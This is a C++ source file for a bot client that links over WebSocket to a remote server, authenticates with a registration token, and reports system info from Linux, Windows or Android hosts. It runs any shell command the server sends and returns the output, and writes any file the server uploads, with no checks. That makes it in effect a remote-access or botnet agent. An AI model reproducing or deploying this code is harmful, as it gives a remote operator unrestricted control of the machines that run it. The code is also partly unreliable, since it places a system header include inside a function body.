#include "bot_handler.h"
#include <boost/process.hpp>
#include <sstream>
#include <fstream>
#include <regex>
#include <spdlog/spdlog.h>
#ifdef __linux__
#include <sys/sysinfo.h>
#endif

BotHandler::BotHandler(const std::string& server_url, const std::string& reg_token, const std::string& bot_id)
    : server_url_(server_url), reg_token_(reg_token), bot_id_(bot_id),
      ssl_ctx_(net::ssl::context::tlsv12_client) {}

void BotHandler::start() {
    connect();
    authenticate();
    std::thread([this] { ioc_.run(); }).detach();
    read_loop();
}

void BotHandler::connect() {
    std::regex url_regex(R"(wss://([^:/]+):?(\d*)(/.*)?)");
    std::smatch match;
    if (!std::regex_match(server_url_, match, url_regex))
        throw std::runtime_error("Invalid server URL");
    std::string host = match[1];
    std::string port = match[2].length() ? match[2] : "443";
    tcp::resolver resolver(ioc_);
    auto results = resolver.resolve(host, port);
    ws_ = std::make_unique<websocket::stream<beast::ssl_stream<tcp::socket>>>(ioc_, ssl_ctx_);
    net::connect(ws_->next_layer().next_layer(), results.begin(), results.end());
    ws_->next_layer().handshake(net::ssl::stream_base::client);
    ws_->handshake(host, "/");
}

void BotHandler::authenticate() {
    nlohmann::json auth;
    auth["type"] = "auth";
    auth["role"] = "bot";
    auth["token"] = reg_token_;
    auth["bot_id"] = bot_id_;
    send(auth.dump());
    beast::flat_buffer buf;
    ws_->read(buf);
    auto resp = nlohmann::json::parse(beast::buffers_to_string(buf.data()));
    if (resp["type"] != "auth_ok") throw std::runtime_error("Bot auth failed");
    bot_id_ = resp["bot_id"];
    spdlog::info("Bot authenticated as {}", bot_id_);
}

void BotHandler::read_loop() {
    beast::flat_buffer buf;
    while (running_) {
        ws_->read(buf);
        handle_message(beast::buffers_to_string(buf.data()));
        buf.consume(buf.size());
    }
}

void BotHandler::handle_message(const std::string& msg) {
    auto j = nlohmann::json::parse(msg);
    std::string type = j["type"];
    nlohmann::json resp;
    resp["type"] = type + "_result";
    if (type == "exec" || type == "shell") {
        std::string cmd = j["command"];
        std::string out = exec_command(cmd);
        resp["output"] = out;
    } else if (type == "sysinfo") {
        resp["info"] = get_sysinfo();
    } else if (type == "upload") {
        std::string filename = j["filename"];
        std::string data = j["data"];
        std::ofstream ofs(filename, std::ios::binary);
        ofs.write(data.data(), data.size());
        resp["status"] = "ok";
    }
    send(resp.dump());
}

void BotHandler::send(const std::string& msg) {
    ws_->write(net::buffer(msg));
}

std::string BotHandler::exec_command(const std::string& cmd) {
    namespace bp = boost::process;
    bp::ipstream out;
    bp::child c(cmd, bp::std_out > out, bp::std_err > out);
    std::string result;
    std::string line;
    while (std::getline(out, line)) result += line + "\n";
    c.wait();
    return result;
}

std::string BotHandler::get_sysinfo() {
    nlohmann::json info;
#if defined(__linux__) && !defined(__ANDROID__)
    struct sysinfo si;
    if (sysinfo(&si) == 0) {
        info["uptime"] = si.uptime;
        info["loads"] = {si.loads[0], si.loads[1], si.loads[2]};
        info["totalram"] = si.totalram;
        info["freeram"] = si.freeram;
    }
#elif defined(_WIN32)
    #include <windows.h>
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem)) {
        info["totalram"] = mem.ullTotalPhys;
        info["freeram"] = mem.ullAvailPhys;
    }
    info["uptime"] = GetTickCount64() / 1000;
#elif defined(__ANDROID__)
    // /proc/meminfo
    std::ifstream meminfo("/proc/meminfo");
    std::string line;
    while (std::getline(meminfo, line)) {
        if (line.find("MemTotal:") != std::string::npos) {
            long kb = 0;
            sscanf(line.c_str(), "MemTotal: %ld", &kb);
            info["totalram"] = kb * 1024;
        } else if (line.find("MemAvailable:") != std::string::npos) {
            long kb = 0;
            sscanf(line.c_str(), "MemAvailable: %ld", &kb);
            info["freeram"] = kb * 1024;
        }
    }
    // uptime
    std::ifstream uptime("/proc/uptime");
    double up = 0;
    if (uptime >> up) info["uptime"] = up;
#endif
    info["platform"] = 
#if defined(__linux__) && !defined(__ANDROID__)
        "linux";
#elif defined(_WIN32)
        "windows";
#else
        "android";
#endif
    return info.dump();
}